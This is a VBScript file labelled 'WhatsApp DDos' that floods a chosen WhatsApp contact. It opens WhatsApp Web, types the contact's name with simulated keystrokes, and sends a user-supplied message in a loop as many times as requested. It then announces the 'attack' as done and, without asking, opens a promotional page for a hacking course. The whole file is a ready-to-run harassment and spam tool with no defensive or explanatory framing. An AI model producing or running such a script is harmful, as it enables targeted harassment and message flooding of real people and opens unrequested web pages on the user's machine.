' InputBoxes
Contact = InputBox("Type contact name" & vbNewLine & vbNewLine &  "Don't use accentuation in the contact name!", "WhatsApp DDos")
Message = InputBox("What is the message to be sent?","WhatsApp DDos")
T = InputBox("How many times does the message need to be sent?" & vbNewLine & vbNewLine & "Type a integer number!","WhatsApp DDos")
If MsgBox("Do you wanna continue?" & vbNewLine & vbNewLine & "Press NO to cancel!", vbYesNo + vbQuestion + vbSystemModal, "WhatsApp DDos") = vbYes Then
 
	' Abre o WhatsApp
	Set WshShell = WScript.CreateObject("WScript.Shell")
	Return = WshShell.Run("https://web.whatsapp.com/", 1)

	' Loading Time
 
	If MsgBox("Is WhatsApp Web open?" & vbNewLine & vbNewLine & "Wait for the page to load!" & vbNewLine & vbNewLine & "Press NO to cancel!", vbYesNo + vbQuestion + vbSystemModal, "WhatsApp DDos") = vbYes Then
 
	' Editado por Limontec.com para evitar bloqueio do WhatsApp
	MsgBox "Do not touch the browser during the attack!" & vbNewLine & vbNewLine & "Starting in 10 seconds.", 1024 + vbSystemModal, "Preparing DDos"
 
	' Abre o WhatsApp Search Bar
	WScript.Sleep 50
	WshShell.SendKeys "{TAB}"
 
	' Busca pelo contato
	WScript.Sleep 50
	WshShell.SendKeys Contact
	WScript.Sleep 5000
	WshShell.SendKeys "{ENTER}"
	WScript.Sleep 5000
 
	' Loop das mensagens
	For i = 0 to T
	WScript.Sleep 5
	WshShell.SendKeys Message
	WScript.Sleep 5
	WshShell.SendKeys "{ENTER}"
	Next
 
	' Fim do Script
	WScript.Sleep 3000
	MsgBox "DDosing on " + Contact + " was done successfully, visit Limontec.com", 1024 + vbSystemModal, "DDos done"
 
	' Mensagem de Script cancelado
	Else
	MsgBox "The process was canceled successfully", vbSystemModal, "DDos Canceled"
	End If
Else
MsgBox "The process was canceled successfully", vbSystemModal, "DDos Canceled"
End If

' Abre o Limontec.com
Set WshShell = WScript.CreateObject("WScript.Shell")
Return = WshShell.Run("https://www.limontec.com/2015/12/curso-hacker-wi-fi-limon-tec.html", 1)